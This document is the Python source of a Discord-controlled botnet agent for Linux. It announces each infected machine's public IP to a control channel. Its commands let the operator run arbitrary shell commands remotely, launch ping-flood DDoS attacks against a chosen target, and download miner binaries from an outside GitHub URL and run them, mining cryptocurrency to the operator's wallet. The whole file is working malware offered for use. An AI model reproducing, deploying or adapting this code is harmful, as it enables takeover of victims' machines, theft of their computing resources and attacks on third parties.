from discord.ext import commands
from discord import app_commands
from tendo import singleton
from urllib import request
import requests
import discord
import psutil
import sys
import os

token = ''
channel_id = 

# sinlge proccess
me = singleton.SingleInstance()

# bot
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)
bot.remove_command('help')
ip = requests.get('https://api.ipify.org').text.strip()

# ram info
total_ram = psutil.virtual_memory().total
mram = int(str(total_ram / 2)[0])

# cd temp
os.chdir("/tmp")

# log
@bot.event
async def on_ready():
    print(f'{bot.user}')
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=ip))
    channel = bot.get_channel(channel_id)
    await channel.send(f"``[+] {ip}: Session opened``")


# ----- Commands ----- #

# sessions
@bot.command()
async def sessions(ctx):
    await ctx.send(f"``--> {ip}``")

# kill
@bot.command()
async def kill(ctx):
    channel = bot.get_channel(channel_id)
    await channel.send(f"``[-] {ip}: Session closed``")
    sys.exit()

# shell
@bot.command()
async def shell(ctx, *args):
    arguments = ' '.join(args)
    stream = os.popen(arguments)
    output = stream.read()
    await ctx.send(f"``{output}``")

# ddos
@bot.command()
async def ddos(ctx, arg1, arg2):
    ddosip = ''.join(arg1)
    ddosbyte = ''.join(arg2)
    os.popen(f"screen -dm ping {ddosip} -l {ddosbyte}") # "-t" slow "-l" fast
    await ctx.send(f"``[+] {ip}: Ddos attack started``")
    
# stop ddos
@bot.command()
async def stopddos(ctx):
    os.system("pkill ping")
    await ctx.send(f"``[-] {ip}: Ddos attack stoped``")

# miner
@bot.command()
async def miner(ctx, arg1):
    url = "https://github.com/rxu7s/Public/raw/main/hellminer"
    response = request.urlretrieve(url, "hellminer")
    
    url = "https://github.com/rxu7s/Public/raw/main/verus-solver"
    response = request.urlretrieve(url, "verus-solver")
    
    os.system("pkill hellminer")
    os.system("pkill verus-solver")
    os.system("chmod 777 hellminer && chmod 777 verus-solver")
        
    wallet = ''.join(arg1)
    os.popen(f"./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u {wallet}.Linux -p x --cpu {mram}")
    await ctx.send(f"``[+] {ip}: Miner started``")

# stop miner
@bot.command()
async def stopminer(ctx):
    os.system("pkill hellminer")
    os.system("pkill verus-solver")
    await ctx.send(f"``[-] {ip}: Miner stoped``")

bot.run(token)